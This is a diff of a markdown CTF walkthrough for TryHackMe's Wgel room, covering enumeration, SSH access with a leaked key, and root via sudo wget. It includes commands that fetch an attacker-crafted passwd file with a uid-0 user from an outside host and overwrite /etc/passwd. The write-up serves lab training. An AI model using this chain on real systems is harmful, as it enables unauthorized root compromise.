@@ -1,11 +1,10 @@
-🛡️ TryHackMe – Wgel CTF
+## 🛡️TryHackMe – Wgel CTF
 Full Technical Walkthrough & Root Compromise Report
-
   
 
 ---
 
-📌 Overview
+## 📌 Overview
 Room Name: Wgel CTF
 
 Platform: TryHackMe
@@ -26,8 +25,8 @@ This assessment simulates a common misconfiguration in Linux environments where 
 
 ---
 
-🔍 1. Enumeration Phase
-🔎 Nmap Scan
+## 🔍 1. Enumeration Phase
+Nmap Scan
 
 Comprehensive port scanning to identify the attack surface:
 
@@ -37,7 +36,7 @@ nmap -sV -oN nmap.log <target_ip>
 
 ```
 
-🌐 Web Directory Enumeration
+Web Directory Enumeration
 
 Using `gobuster` to discover hidden directories:
 
@@ -53,7 +52,7 @@ Discovered Paths:
 
 ---
 
-🔓 2. Initial Access
+## 🔓 2. Initial Access
 Using the discovered RSA key and the username jessie (found in comments), I established an SSH connection.
 
 ```
@@ -68,8 +67,22 @@ ssh -i id_rsa jessie@<target_ip>
 
 ---
 
-🚀 3. Privilege Escalation Discovery
-Checked sudo permissions:
+## 🚀 3. Privilege Escalation Discovery
+After gaining initial access, I performed post-exploitation enumeration to find a path to root.
+
+Running LinPEAS
+
+I uploaded and executed `linpeas.sh` to automate the discovery of vulnerabilities.
+
+```
+
+./linpeas.sh
+
+```
+
+Critical Finding
+
+The script highlighted a critical misconfiguration in sudo permissions. I verified this by running:
 
 ```
 
@@ -77,7 +90,7 @@ sudo -l
 
 ```
 
-🔑 Critical Finding
+Result:
 
 ```
 
@@ -85,12 +98,11 @@ sudo -l
 
 ```
 
-The user `jessie` can run `wget` as root without a password. This allows for Arbitrary File Write.
+LinPEAS identified that the `wget` command can be executed by every user as root without a password. This allows for an Arbitrary File Write attack, which can be used to overwrite system-critical files.
 
----
 
-🛠️ 4. Exploitation (The /etc/passwd Attack)
-Step 1: Password Hashing
+## 🛠️ 4. Exploitation (The /etc/passwd Attack)
+### Step 1: Password Hashing
 
 On the Kali machine, I generated an MD5-crypt hash for the password `1234`:
 
@@ -102,7 +114,7 @@ openssl passwd -1 1234
 
 ```
 
-Step 2: Crafting Malicious passwd File
+### Step 2: Crafting Malicious passwd File
 
 I created a local `passwd` file and appended a custom root user:
 
@@ -112,7 +124,7 @@ hacker:$1$oDwlj2tO$VL4knQ9qhR2F6K7bOrT2B0:0:0:root:/root:/bin/bash
 
 ```
 
-Step 3: File Transfer & Overwrite
+### Step 3: File Transfer & Overwrite
 
 Used `wget` to overwrite the real `/etc/passwd`:
 
@@ -124,7 +136,7 @@ sudo /usr/bin/wget http://<kali_ip>/passwd -O /etc/passwd
 
 ---
 
-🏁 5. Root Capture
+## 🏁 5. Root Capture
 Switched to the new user:
 
 ```
@@ -143,7 +155,7 @@ id
 
 ---
 
-🧠 Key Takeaways
+## 🧠 Key Takeaways
 1. The Danger of 'Safe' Binaries: Binaries like `wget` can be fatal if granted `sudo` rights.
 
 2. Comment Hygiene: Developers must scrub internal usernames from production code.
